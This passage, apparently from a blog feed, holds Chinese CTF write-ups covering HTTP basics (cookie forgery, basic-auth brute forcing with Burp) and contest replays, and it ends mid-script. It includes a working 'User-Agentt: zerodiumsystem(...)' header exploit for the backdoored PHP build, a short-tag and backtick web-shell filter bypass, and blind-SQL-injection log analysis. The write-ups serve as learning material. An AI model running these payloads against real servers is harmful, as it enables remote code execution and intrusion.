title="302跳转"></a>302跳转</h2><p>HTTP临时重定向<br><img src="https://img-blog.csdnimg.cn/20210329202651177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击超链接无反应，查看源码发现了index.php，而此时url栏是index.html<br><img src="https://img-blog.csdnimg.cn/20210329202712652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>burpsite抓包，在响应包得到flag<br><img src="https://img-blog.csdnimg.cn/20210329202803184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：<br>curl命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i http://challenge-f6959bd27c1b2b09.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329161745105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl命令<br>https://blog.csdn.net/qq_45738111/article/details/105265455<br></code></pre></td></tr></table></figure><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie欺骗、认证、伪造</p><p><a href="http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/">http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080</a><br>方法一：</p><p>抓包，响应头提示只有admin才能得到flag，此时请求头Cookie的值为admin=0<br><img src="https://img-blog.csdnimg.cn/20210329200457714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>改为admin=1，得到flag<br><img src="https://img-blog.csdnimg.cn/20210329200506541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：</p><p>可以使用curl命令的”-H”参数来为http请求头添加cookie键值来发送cookie：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i -H <span class="hljs-string">&quot;Cookie:admin=1&quot;</span> http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329191357125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81">https://zh.wikipedia.org/wiki/HTTP基本认证</a></p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20210329192024754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>跳转到登陆页面<br><img src="https://img-blog.csdnimg.cn/2021032919204261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>先输入弱密码admin\123456登陆，然后抓包<br><img src="https://img-blog.csdnimg.cn/20210329192830793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在请求头发现一段base64编码，解码得到<code>admin:123456</code>，而在响应头发现一段话Do u know admin ?，再结合题目附件中给的字典，所以说本题应该是爆破管理员密码，与以往爆破密码不同的是，账号和密码一起被base64加密了。</p><p>将请求报文发送到Intruder，点击Add，将 Basic 后面 base64 部分添加为 payload position<br><img src="https://img-blog.csdnimg.cn/20210329193459133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在Payload Options模块中点击load添加字典，在Payload Processing模块中点击添加选择Add prefix，其值为<code>admin:</code>,继续选择encode，其值为base64-encode，最后点击Start attck开始爆破<br><img src="https://img-blog.csdnimg.cn/20210329194328455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆破结果按Length排序，发现值为<code>YWRtaW46MTIzMzIx</code>，此时状态码为200，说明是正确的账号密码。<br><img src="https://img-blog.csdnimg.cn/20210329194425899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>base64解密得到<code>admin:123321</code>,输入账号密码登陆得到flag，在响应头也能看到flag<br><img src="https://img-blog.csdnimg.cn/20210329194850620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h2><p>HTTP响应包源代码查看</p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20210329195659368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>抓包，发包，在响应包源码发现了flag。<br><img src="https://img-blog.csdnimg.cn/20210329195714758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接查看源代码也可以发现flag<br><img src="https://img-blog.csdnimg.cn/20210329195946922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考:<br><a href="https://baike.baidu.com/item/http/243074?fromtitle=HTTP">百度百科-HTTP协议</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：深入学习HTTP协议&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="协议基础" scheme="http://atkx.top/tags/%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>虎符+红明谷+ctfshow渔人杯赛后复现</title>
    <link href="http://atkx.top/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://atkx.top/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-04-05T13:40:02.000Z</published>
    <updated>2021-08-15T03:59:06.619Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：记录最近几场比赛的赛后复现</p> <a id="more"></a><h1 id="虎符CTF"><a href="#虎符CTF" class="headerlink" title="虎符CTF"></a>虎符CTF</h1><h2 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web-签到"></a>Web-签到</h2><p><img src="https://img-blog.csdnimg.cn/20210404100847899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考<a href="http://cn-sec.com/archives/313267.html">详细分析PHP源代码后门事件及其供应链安全启示</a></p><p>根据文章提示，添加恶意请求头</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumphpinfo();<br></code></pre></td></tr></table></figure><p>可以看到phpinfo内容<br><img src="https://img-blog.csdnimg.cn/20210404100629750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续构造，查看根目录下的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404100940524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读取flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404101127186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="MISC-你会日志分析吗"><a href="#MISC-你会日志分析吗" class="headerlink" title="MISC-你会日志分析吗"></a>MISC-你会日志分析吗</h2><p><img src="https://img-blog.csdnimg.cn/20210404101326722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析日志，该日志应该是用脚本进行布尔盲注，最后一步是爆flag的值，发现有两种长度的包，猜测长度377代表爆值成功，长度399代表失败<br><img src="https://img-blog.csdnimg.cn/20210404103342703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>列出长度为377的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61<br></code></pre></td></tr></table></figure><p>使用脚本进行处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">90</span>,<span class="hljs-number">109</span>,<span class="hljs-number">120</span>,<span class="hljs-number">104</span>,<span class="hljs-number">90</span>,<span class="hljs-number">51</span>,<span class="hljs-number">116</span>,<span class="hljs-number">90</span>,<span class="hljs-number">98</span>,<span class="hljs-number">51</span>,<span class="hljs-number">86</span>,<span class="hljs-number">102</span>,<span class="hljs-number">89</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">108</span>,<span class="hljs-number">88</span>,<span class="hljs-number">51</span>,<span class="hljs-number">78</span>,<span class="hljs-number">118</span>,<span class="hljs-number">88</span>,<span class="hljs-number">50</span>,<span class="hljs-number">100</span>,<span class="hljs-number">121</span>,<span class="hljs-number">90</span>,<span class="hljs-number">87</span>,<span class="hljs-number">70</span>,<span class="hljs-number">48</span>,<span class="hljs-number">102</span>,<span class="hljs-number">81</span>,<span class="hljs-number">61</span>,<span class="hljs-number">61</span>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    flag=flag+<span class="hljs-built_in">chr</span>(i)<br>    <br>print(flag)<br>print(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==<br>b<span class="hljs-string">&#x27;flag&#123;You_are_so_great&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>一个一个找长度为377的包太麻烦了，附上大师傅的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">from base64 import *<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>with open(<span class="hljs-string">&#x27;access.log&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;select%20flag%20from%20flllag&quot;</span> <span class="hljs-keyword">in</span> line:<br>            packet_len = line[line.find(<span class="hljs-string">&#x27; 200 &#x27;</span>)+5:line.find(<span class="hljs-string">&#x27; &quot;-&quot; &quot;python-requests/2.21.0&quot;&#x27;</span>)]<br>            <span class="hljs-keyword">if</span> packet_len == <span class="hljs-string">&#x27;377&#x27;</span>:<br>                ascii_code = line[line.find(<span class="hljs-string">&#x27;))=&#x27;</span>)+3:line.find(<span class="hljs-string">&#x27;,sleep&#x27;</span>)]<br>                ascii_str = chr(int(ascii_code))<br>                flag += ascii_str<br>            <span class="hljs-keyword">else</span>:<br>                pass<br>        <span class="hljs-keyword">else</span>:<br>            pass<br><br><span class="hljs-built_in">print</span>(b64decode(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="红明谷CTF"><a href="#红明谷CTF" class="headerlink" title="红明谷CTF"></a>红明谷CTF</h1><h2 id="Web-write-shell"><a href="#Web-write-shell" class="headerlink" title="Web-write_shell"></a>Web-write_shell</h2><p>没报上名，在BUU上面找到的环境<br><img src="https://img-blog.csdnimg.cn/20210405165110827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>知识点：短标签绕过php过滤</strong></p><blockquote><p>PHP开启短标签即short_open_tag=on时，可以使用<?=$_?>输出变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = waf(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = check(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        waf(<span class="hljs-variable">$data</span>);<br>        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、写入文件，但是对<span class="hljs-variable">$data</span>变量进行了过滤<br>2、使用&lt;?=?&gt; 短标签即可绕过php然后输出<br>3、用反引号直接执行命令<br>4、过滤了空格,用%09代替空格<br></code></pre></td></tr></table></figure><p>根据源码，先查看当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=<span class="hljs-built_in">pwd</span> <br><span class="hljs-comment">#sandbox/d99081fe929b750e0557f85e6499103f/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404173216510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>尝试读取根目录下的所有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=upload&amp;data=&lt;?=`cat%09/*`?&gt;<br></code></pre></td></tr></table></figure><p>最后访问<code>/sandbox/d99081fe929b750e0557f85e6499103f/</code>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404173408667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="MISC-我的心是冰冰的"><a href="#MISC-我的心是冰冰的" class="headerlink" title="MISC-我的心是冰冰的"></a>MISC-我的心是冰冰的</h2><p>题目描述：似乎有信息被隐藏了。</p><p>打开rar压缩包文件受损，可能存在RAR伪加密，按照<a href="https://l1near.top/index.php/2021/03/15/97.html#comment-174">L1near师傅的博客</a>，将24字节处的84改为80即可<br><img src="https://img-blog.csdnimg.cn/20210404180245275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压压缩包得到<br><img src="https://img-blog.csdnimg.cn/20210404180359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看wp发现是java盲水印</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar BlindWatermark.jar decode -c bingbing.jpg decode.jpg<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210408214553555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>得到口令<code>gnibgnib</code>，解压得到bingbing.pcapng流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>tshark提取USB流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>剔除空行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用脚本加上冒号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量的话len改为16</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>通用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span 